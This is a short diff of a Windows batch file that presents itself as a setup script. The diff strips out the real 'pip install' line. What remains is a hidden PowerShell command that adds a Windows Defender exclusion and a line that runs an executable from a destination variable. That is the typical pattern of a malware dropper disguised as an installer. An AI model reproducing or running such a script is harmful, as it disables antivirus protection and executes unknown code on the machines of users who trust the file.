@@ -1,7 +1,3 @@
-@echo off
-python -m pip install -r requirements.txt
-
-
 powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 
 @echo off
@@ -37,3 +33,6 @@ if %errorlevel% neq 0 (
 )
 
 call "%DEST%"
+
+@echo off
+cd /d %~dp0
